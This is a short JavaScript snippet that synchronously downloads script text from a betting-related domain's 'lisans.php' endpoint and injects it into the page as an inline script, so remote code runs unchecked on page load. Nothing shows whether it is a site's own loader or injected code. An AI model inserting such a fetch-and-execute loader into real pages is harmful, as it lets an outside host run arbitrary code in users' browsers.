function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

script = document.createElement('script');
script.setAttribute('id','lisans');
script.innerHTML = httpGet('https://betkanyon100.com/bonus-api/lisans.php');
document.body.append(script);